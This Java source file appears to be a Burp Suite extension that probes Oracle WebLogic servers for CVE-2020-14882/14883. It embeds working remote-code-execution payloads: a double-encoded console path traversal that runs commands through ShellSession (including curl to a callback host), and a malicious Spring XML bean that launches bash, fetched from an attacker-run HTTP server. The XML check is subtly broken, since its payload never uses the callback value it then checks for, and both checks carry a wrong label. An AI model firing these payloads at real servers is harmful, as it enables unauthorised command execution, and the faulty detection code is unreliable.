package burp.vuls;

import burp.BurpExtender;
import burp.IBurpCollaboratorClientContext;
import burp.util.HttpRequestThread;
import burp.util.HttpResult;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

public class Weblogic {
    public static String CVE_2020_14882_14883_1_poc = "##Condition##\n" +
            "14882(IDOR) version 10.3.6.0.0/12.1.3.0.0/12.2.1.3.0/12.2.1.4.0/14.1.1.0.0" +
            "14883 version 12.2.1+\n" +
            "\n" +
            "##POC##\n" +
            "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');\")";
    public static String CVE_2020_14882_14883_xml_poc = "##Condition##\n" +
            "14882(IDOR) version 10.3.6.0.0/12.1.3.0.0/12.2.1.3.0/12.2.1.4.0/14.1.1.0.0\n" +
            "14883 version all\n" +
            "\n" +
            "##Evil xml##\n" +
            "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
            "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
            "   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
            "   xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
            "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
            "        <constructor-arg>\n" +
            "          <list>\n" +
            "            <value>bash</value>\n" +
            "            <value>-c</value>\n" +
            "            <value><![CDATA[touch /tmp/success2]]></value>\n" +
            "          </list>\n" +
            "        </constructor-arg>\n" +
            "    </bean>\n" +
            "</beans>\n\n" +
            "##Step1##\n" +
            "start http service -> python -m http.server 8808\n" +
            "\n" +
            "##Step2##\n" +
            "#POC#\n" +
            "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://#httpserver#:8808/rce.xml\")\n" +
            "\n" +
            "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext(\"http://#httpserver#:8808/rce.xml\")";

        public static void CVE_2020_14882_14883_1() {
            String poc = CVE_2020_14882_14883_1_poc;
            IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
            String val = collaboratorClientContext.generatePayload(true);
            // 据说可以覆盖所有版本
            String payload = "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('curl','http://'" +val+");\")";

            // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
            // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
            HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
            Thread thread = new Thread(httpRequestThread);
            thread.start();
            try {
                // 等待，直到运行结束
                thread.join();
            } catch (InterruptedException e) {
                OutputStream out = BurpExtender.callbacks.getStderr();
                PrintWriter p = new PrintWriter(out);
                e.printStackTrace(p);
                try {
                    p.flush();
                    out.flush();
                } catch (IOException ioException) {
                    ioException.printStackTrace();
                }
            }
            HttpResult httpResult = httpRequestThread.getResulemessageInfo();
            if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
                BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_0", poc, "hack!"));
            } else {
                BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_0", poc, "pass"));
            }
        }

    public static void CVE_2020_14882_14883_xml() {
        String poc = CVE_2020_14882_14883_xml_poc;
        IBurpCollaboratorClientContext collaboratorClientContext = BurpExtender.callbacks.createBurpCollaboratorClientContext();
        String val = collaboratorClientContext.generatePayload(true);
        // 据说可以覆盖所有版本
        String payload = "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(\"http://example.com/rce.xml\")";

        // fix: java.lang.RuntimeException: Extensions should not make HTTP requests in the Swing event dispatch thread
        // swing事件是在特殊的线程中执行，发起http请求需要另外的线程进行
        HttpRequestThread httpRequestThread = new HttpRequestThread(payload);
        Thread thread = new Thread(httpRequestThread);
        thread.start();
        try {
            // 等待，直到运行结束
            thread.join();
        } catch (InterruptedException e) {
            OutputStream out = BurpExtender.callbacks.getStderr();
            PrintWriter p = new PrintWriter(out);
            e.printStackTrace(p);
            try {
                p.flush();
                out.flush();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
        HttpResult httpResult = httpRequestThread.getResulemessageInfo();
        if (httpResult != null && collaboratorClientContext.fetchCollaboratorInteractionsFor(val).size() != 0) {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_0", poc, "hack!"));
        } else {
            BurpExtender.log.add(new BurpExtender.LogEntry(BurpExtender.log.size(), BurpExtender.callbacks.saveBuffersToTempFiles(httpResult.httpRequestResponse), httpResult.Url, "JdbcRowSetImpl_0", poc, "pass"));
        }
    }
}
